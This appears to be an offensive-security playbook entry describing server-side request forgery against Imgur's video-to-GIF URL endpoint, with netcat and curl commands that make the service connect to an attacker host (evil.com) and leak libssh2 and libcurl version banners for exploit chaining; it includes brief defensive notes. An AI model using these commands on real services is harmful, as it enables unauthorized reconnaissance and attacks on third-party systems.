---
tags:
  - ssrf
  - information-disclosure
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/nc-listen-tcp-verbose]]'
  - '[[commands/curl-ssrf-trigger]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T03:46:09.016Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 8afdd445-3664-4d38-9d96-47c65fd4a82e
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
---
# Capture-SSRF-Connections-with-Netcat-for-Info-Disclosure

## Summary

Set up a netcat listener to capture inbound connections from Imgur servers triggered by SSRF, leaking software versions like libssh2 1.4.2 and libcurl 7.40.0 via protocol banners, enabling CVE chaining for RCE.

## Description

By using protocols like SFTP or DICT in the SSRF payload, Imgur's libcurl connects to the attacker's listener, sending client banners that disclose versions vulnerable to known exploits (e.g., CVE-2015-1782). This is useful for reconnaissance in web app pentests.

## Requirements

1. Netcat installed on attacker machine
2. Public IP/port forwarding for listener (e.g., port 11111 open)
3. Domain control for evil.com

## Defense

Defensive measures and detection strategies:

- Firewall outbound connections to restrict non-HTTP traffic
- Log and alert on unexpected protocol usage in application logs
- Use allowlists for destination IPs in SSRF-prone endpoints

## Objectives

1. Leak internal software versions for vulnerability research
2. Confirm SSRF reachability to external hosts
3. Gather data for potential RCE exploitation

## Instructions

### Step 1: Start TCP Listener

**Context**: Listen for connections on port 11111 to capture banners.

**Command** ([[commands/nc-listen-tcp-verbose]]):
```bash
nc -v -l 11111
```

> Verbose listen mode on port 11111. Expected output: Connection accepted from Imgur IP, followed by banner like "SSH-2.0-libssh2_1.4.2" or "CLIENT libcurl 7.40.0" then QUIT.

### Step 2: Trigger SSRF Connection

**Context**: Send payload to Imgur to initiate connection.

**Command** ([[commands/curl-ssrf-trigger]]):
```bash
curl "https://imgur.com/vidgif/url?url=sftp://evil.com:11111/"
```

> This forces Imgur to connect via SFTP. Success if banner appears in netcat output.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information

### Sub-Techniques

- None

## Commands Used

- [[commands/nc-listen-tcp-verbose]]
- [[commands/curl-ssrf-trigger]]

## Tools Used

- [[tools/netcat]]

## Tags

- [[ssrf]]
- [[information-disclosure]]
